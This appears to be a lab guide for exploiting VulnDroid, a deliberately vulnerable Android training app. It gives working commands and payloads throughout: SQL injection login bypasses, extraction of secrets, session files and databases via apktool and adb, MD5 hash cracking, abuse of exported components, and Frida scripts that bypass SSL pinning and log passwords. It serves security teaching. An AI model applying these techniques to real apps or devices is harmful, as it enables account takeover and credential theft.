# VulnDroid — Attack Guide

Step-by-step exploitation guide for each vulnerability.
Use this alongside the security assessment report.

---

## Environment Setup

```bash
# 1. Start Android emulator (rooted Pixel 3 API 29 image recommended)
emulator -avd Pixel_3_API_29 -writable-system

# 2. Install VulnDroid
adb install vulndroid.apk

# 3. Verify debug build (debuggable=true means run-as works)
adb shell dumpsys package com.weijia.vulndroid | grep debuggable

# 4. Install Frida server on emulator
adb push frida-server /data/local/tmp/
adb shell chmod +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# 5. Configure Burp Suite proxy
# Burp: Proxy > Options > 127.0.0.1:8080
# Emulator: Settings > WiFi > Proxy > 127.0.0.1:8080
```

---

## Attack 1 — Extract Hardcoded Credentials (M1)

```bash
# No root, no special tools — just apktool
apktool d vulndroid.apk -o vulndroid_decompiled
cat vulndroid_decompiled/res/values/strings.xml | grep -E "key|password|secret|token"

# Expected output:
# api_key: sk-prod-9f8a2b1c3d4e5f6g7h8i9j0k1l2m3n4
# admin_password: Admin@123!
# db_encryption_key: vulndroid-db-secret-2024
# jwt_secret: my-super-secret-jwt-signing-key-never-commit-this
```

---

## Attack 2 — SQL Injection Authentication Bypass (M3 + M4)

```
Launch app → Login screen
Username field: admin' --
Password field: anything123
Tap Sign In

Expected: Logged in as admin without knowing the password
Evidence: Logcat shows: Auth query: SELECT * FROM users WHERE username='admin' --'...
```

---

## Attack 3 — Extract All Users via SQL Injection (M4)

```
Navigate to: Dashboard > Search Users
Search field: ' OR '1'='1

Expected: All user records returned including admin account
```

---

## Attack 4 — Intercept Network Traffic (M5)

```bash
# With Burp Suite running and emulator proxy configured:
# Open VulnDroid and log in
# Check Burp Suite HTTP History

# Expected: Full request body visible in plaintext:
# POST http://api.vulndroid-backend.com/v1/auth/login
# Content: {"username":"john.doe","password":"password123"}
# Response: {"token":"Bearer eyJhbGc...","user_id":1}
```

---

## Attack 5 — Read Credentials from SharedPreferences (M9)

```bash
# Works on debug build without root
adb shell run-as com.weijia.vulndroid cat /data/data/com.weijia.vulndroid/shared_prefs/user_session.xml

# Expected output:
# <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
# <map>
#   <string name="username">john.doe</string>
#   <string name="password">password123</string>   ← plaintext!
#   <string name="auth_token">am9obi5kb2U6...</string>
# </map>
```

---

## Attack 6 — Extract SQLite Database (M9)

```bash
# Copy database from device
adb shell run-as com.weijia.vulndroid cp /data/data/com.weijia.vulndroid/databases/vulndroid.db /sdcard/
adb pull /sdcard/vulndroid.db

# Open with sqlite3
sqlite3 vulndroid.db
sqlite> .tables
sqlite> SELECT * FROM users;
sqlite> SELECT * FROM notes;  # Contains server root password in seed data!
```

---

## Attack 7 — Crack MD5 Password Hashes (M10)

```bash
# Get hashes from database (see Attack 6)
# Hash for "password123": 482c811da5d5b4bc6d497ffa98491e38

# Crack with hashcat
hashcat -m 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt

# Or submit to crackstation.net — cracked in < 1 second online
```

---

## Attack 8 — Launch Exported Activity Without Auth (M8)

```bash
# Bypass login and go directly to password reset
adb shell am start -n com.weijia.vulndroid/.ui.VulnerableDeepLinkActivity

# Expected: Password reset screen opens — no authentication required
```

---

## Attack 9 — Query Exported ContentProvider (M8)

```bash
# Read all user data without any permission
adb shell content query --uri content://com.weijia.vulndroid.provider/users

# Expected: All user rows returned including email, phone, DOB, MD5 hash
```

---

## Attack 10 — Read Credentials from Logcat (M6)

```bash
# Monitor logs while using the app
adb logcat | grep -i "vulndroid"

# Expected during login:
# D/VulnDroid_Login: Login attempt — username: john.doe, password: password123
# D/VulnDroid_DB: Auth query: SELECT * FROM users WHERE username='john.doe'...
# D/VulnDroid_API: {"username":"john.doe","password":"password123"}
```

---

## Frida Scripts — Runtime Attacks

### Bypass SSL Pinning (if it were implemented)

```javascript
// frida_ssl_bypass.js
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: 'com.weijia.vulndroid.bypass.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    // Note: VulnDroid already has disabled SSL — this would be used on a secure app
    console.log('[*] SSL bypass loaded');
});
```

```bash
frida -U -n com.weijia.vulndroid -l frida_ssl_bypass.js
```

### Hook Login Function

```javascript
// frida_hook_login.js
Java.perform(function() {
    var LoginActivity = Java.use('com.weijia.vulndroid.ui.login.LoginActivity');
    LoginActivity.attemptLogin.implementation = function(username, password) {
        console.log('[*] Login attempt:');
        console.log('    Username: ' + username);
        console.log('    Password: ' + password);
        this.attemptLogin(username, password);
    };
});
```

```bash
frida -U -n com.weijia.vulndroid -l frida_hook_login.js
```

---

## MobSF — Automated Scan

```bash
# Run MobSF static analysis
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Upload vulndroid.apk via browser: http://127.0.0.1:8000
# MobSF will identify:
# - Hardcoded secrets in strings.xml
# - Exported components without permissions
# - debuggable=true and allowBackup=true
# - Cleartext traffic permitted
# - Insecure random usage
# - Weak hash algorithms (MD5, SHA-1)
```

---

*This guide is for educational use only within a controlled lab environment.*
